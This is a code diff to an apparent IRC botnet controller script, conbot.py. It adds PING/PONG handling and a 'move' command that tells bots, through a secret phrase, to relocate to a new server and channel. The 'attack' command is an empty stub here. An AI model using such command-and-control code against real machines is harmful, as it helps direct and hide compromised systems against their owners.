@@ -2,7 +2,7 @@ import sys
 import socket
 import random
 import time
-
+import _thread
 # argv check
 try:
     hostname= sys.argv[1]
@@ -13,6 +13,18 @@ except:
     print("invalid arguments: python3 conbot.py <hostname> <port> <channel> <secret-phrase>")
     sys.exit()
 
+def ping_answer(irc):
+    while True:
+
+        indata = irc.recv(1024)
+        inmsg = indata.decode("utf-8").split()
+        print(inmsg)
+        if 'PING' in inmsg[0]:
+            msg = "PONG "+inmsg[1]
+            irc.send(msg.encode())
+            print ("PONG!")
+        else:
+            pass
 # use to establish the first connection with a irc
 def connect():
     while True:
@@ -76,6 +88,11 @@ def status():
     sys.stdout.flush()
     return totalBot
 
+#handle move commands
+def move(newhost,newport,newch):
+    msg = "PRIVMSG #"+channel+" :"+sphrase+" move "+newhost+" "+newport+" "+newch+"\r\n"
+    irc.send(msg.encode())
+    return
 
 # use to grab user command
 def commands():
@@ -95,7 +112,7 @@ def commands():
             elif data[0] == "attack":
                 pass
             elif data[0] == "move":
-                pass
+                move(data[1],data[2],data[3])
             else:
                 sys.stderr.write("Not a valid command\n")
 
@@ -111,6 +128,7 @@ irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 irc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
 botname = ""
+
 while True:
     connect()
     commands()
